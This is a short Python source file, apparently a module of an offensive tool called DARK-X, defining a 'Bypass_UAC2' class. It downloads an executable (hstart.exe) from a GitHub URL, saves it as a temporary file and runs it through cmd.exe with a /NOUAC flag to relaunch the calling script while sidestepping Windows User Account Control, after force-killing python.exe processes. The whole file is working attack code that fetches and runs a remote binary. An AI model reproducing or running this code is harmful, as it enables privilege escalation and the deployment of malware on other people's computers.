import requests
import tempfile
from subprocess import Popen,PIPE
import sys
class Bypass_UAC2():
	def __init__(self,_):
		self.note = _.note
		self.hstart = "https://raw.githubusercontent.com/UQABXO/DARK-X/main/bin/hstart.exe"
		self.Main()

	def Main(self):
		req = requests.get(self.hstart)
		file = tempfile.TemporaryFile()
		filename = file.name + ".exe"
		file.close()

		file = open(filename, "wb")
		file.write(req.content)
		file.close()

		python = sys.executable
		me = sys.argv[0]
		sub = Popen(["cmd.exe","/c","taskkill","/IM","python.exe","/F","&",filename, '/NOCONSOLE', '/NOUAC', python + " " + me + " " + self.note], shell=True)
